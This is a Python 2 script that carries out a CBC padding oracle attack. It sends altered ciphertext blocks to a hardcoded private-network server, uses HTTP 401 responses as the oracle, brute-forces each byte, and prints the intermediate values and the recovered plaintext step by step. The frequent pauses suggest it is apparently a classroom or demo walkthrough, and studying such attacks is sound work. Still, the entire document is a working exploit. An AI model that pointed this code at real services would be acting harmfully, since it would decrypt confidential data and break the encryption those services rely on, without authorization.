import requests

intermediate_print = ["??", "??", "??", "??", "??", "??", "??", "??", "??", "??", "??", "??", "??", "??", "??", "??"]

def decipher(iv, block, block_num):
    intermediate = []
    for pad_byte in range(1, 17):
        byte_num = str(-(pad_byte - 17))
        print " Brute forcing byte " + byte_num + " of Block " + str(block_num-1)
        padding = chr(pad_byte)
        print " Target padding: 0x" + padding.encode("hex")
        raw_input()
        tmp = []
        if len(intermediate) > 0:
            for byte in intermediate:
                refactor = int(hex(byte), 16) ^ int(padding.encode("hex"), 16)
                refactor_s = format(refactor, 'x')
                if len(refactor_s) < 2:
                    refactor_s = '0' + refactor_s
                tmp.append(refactor_s)

        for byte in range(256):
            bf = chr(byte).encode("hex")
            payload_pad = (30 - len(tmp) * 2) * '0'
            url = server + payload_pad + bf + (''.join(tmp[::-1])) + block
            r = requests.get(url)
            if r.status_code == 401 and int(byte_num) >= 14:
                result = int(bf, 16) ^ int(padding.encode("hex"), 16)
                intermediate.append(result)
                print " !!! 401 Detected - Found valid padding !!!"
                print " Detected byte for valid padding: 0x" + bf
                print " Payload (modified Block " + str(block_num-1) + "): " + payload_pad + bf + (''.join(tmp[::-1]))
                raw_input()
                print " Block["+str(block_num)+"][Intermediate][" + byte_num +"] = Block[" + str(block_num-1)+"][Payload][" \
                      + byte_num + "] XOR Block[" + str(block_num)+"][padding]["+byte_num+"]"
                print " Block["+str(block_num)+"][Intermediate][" + byte_num +"] = 0x" + bf + " XOR 0x" + padding.encode("hex")
                print " Block["+str(block_num)+"][Intermediate][" + byte_num +"] = " + str(hex(result))
                intermediate_print[int(byte_num) - 1] = str(hex(result))[2:]
                raw_input()
                print " Intermediate Block[" + str(block_num) + "]: " + ' '.join(intermediate_print)
                raw_input()
                print "***************"
                print "\n"
                break
            elif r.status_code == 401 and int(byte_num) < 14:
                result = int(bf, 16) ^ int(padding.encode("hex"), 16)
                intermediate.append(result)
                print " !!! 401 Detected - Found valid padding !!!"
                print " Detected byte for valid padding: 0x" + bf
                print " Payload (modified Block " + str(block_num-1) + "): " + payload_pad + bf + (''.join(tmp[::-1]))
                print " Block["+str(block_num)+"][Intermediate][" + byte_num +"] = Block[" + str(block_num-1)+"][Payload][" \
                      + byte_num +"] XOR Block["+str(block_num)+"][padding]["+byte_num+"]"
                print " Block["+str(block_num)+"][Intermediate][" + byte_num +"] = 0x" + bf + " XOR 0x" + padding.encode("hex")
                print " Block["+str(block_num)+"][Intermediate][" + byte_num +"] = " + str(hex(result))
                intermediate_print[int(byte_num) - 1] = str(hex(result))[2:]
                print " Intermediate Block[" + str(block_num) + "]: " + ' '.join(intermediate_print)
                print "***************"
                print "\n"
                break


    cleartext = decrypt(iv, intermediate, block_num)
    return cleartext


def decrypt(iv, intermediate, block_num):
    intermediate_new = intermediate[::-1]
    intermediate_s = ''.join(format(byte, '02x') for byte in intermediate_new)
    cleartext = hex(int(iv, 16) ^ int(intermediate_s, 16))
    cleartext = cleartext[:-1][2:]
    cleartext = cleartext.decode("hex")
    print "#### Finding Plain text"
    raw_input()
    print "Block[" + str(block_num) +"][Plaintext] = Intermediate Block[" + str(block_num) + "] XOR Block[" + str(block_num) + "]"
    raw_input()
    print ' '.join(intermediate_print)
    raw_input()
    print "XOR"
    raw_input()
    iv_print = [iv[iv_byte:iv_byte+2] for iv_byte in range(0, len(iv), 2)]
    print ' '.join(iv_print)
    print "="
    raw_input()
    cleartext_print = hex(int(iv, 16) ^ int(intermediate_s, 16))
    cleartext_print = cleartext_print[:-1][2:]
    cleartext_print = [cleartext_print[cleartext_byte:cleartext_byte+2] for cleartext_byte in range(0, len(iv), 2)]
    print ' '.join(cleartext_print)
    raw_input()
    return cleartext


def split_to_blocks(ciphertext):
    blocks = []
    num_block = len(ciphertext) // 32
    for i in range(0, num_block):
        byte_count = i * 32
        cipher_block = ciphertext[byte_count:byte_count + 32]
        blocks.append(cipher_block)

    return blocks


if __name__ == "__main__":
    server = "http://192.168.200.247:8080/?cipher="
    #ciphertext = "a2172b31213827338b46e28123ab5e14351b2c3c35a6f49530f5ad149190b715"
    print "\n"
    ciphertext = raw_input('Enter ciphertext: ')
    print "\n"
    blocks = split_to_blocks(ciphertext)
    for block_num in range(len(blocks)):
        if block_num + 1 == 1:
            print "Block " + str(block_num + 1) + ' (IV): ' + blocks[block_num]
        else:
            print "Block " + str(block_num + 1) + ':      ' + blocks[block_num]

    raw_input("\n")
    cleartext_full = []
    for i in range(len(blocks) - 1, 0, -1):
        print "########  Deciphering Block " + str(i + 1) + " ########"
        print "\n"
        cleartext = decipher(blocks[i - 1], blocks[i], i+1)
        cleartext_full.append(cleartext)

    print "ASCII = " + ''.join(reversed(cleartext_full))
